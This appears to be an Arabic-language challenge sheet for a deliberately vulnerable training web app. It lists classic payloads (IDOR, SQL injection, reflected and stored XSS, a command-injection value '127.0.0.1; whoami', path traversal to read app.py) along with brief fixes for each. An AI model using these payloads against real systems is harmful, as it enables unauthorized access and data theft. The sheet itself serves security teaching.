# 🎯 تحديات mSec.Nexus

## المستوى 1
### IDOR
سجّل دخول sara/sara2026 ثم افتح /dashboard?id=1

### SQL Injection
/login
Username: admin' --
Password: x

## المستوى 2
### Reflected XSS
/search?q=<script>alert(1)</script>

### Stored XSS
/blog/1 → اكتب تعليق: <script>alert(1)</script>

## المستوى 3
### Command Injection
/tools/ping → 127.0.0.1; whoami

### LFI
/page?name=../app.py

## الحلول
- IDOR: uid = session['uid']
- SQLi: استخدام ? placeholders
- XSS: شيل | safe
- CMD: shell=False
- LFI: whitelist

⚠️ تعليمي فقط
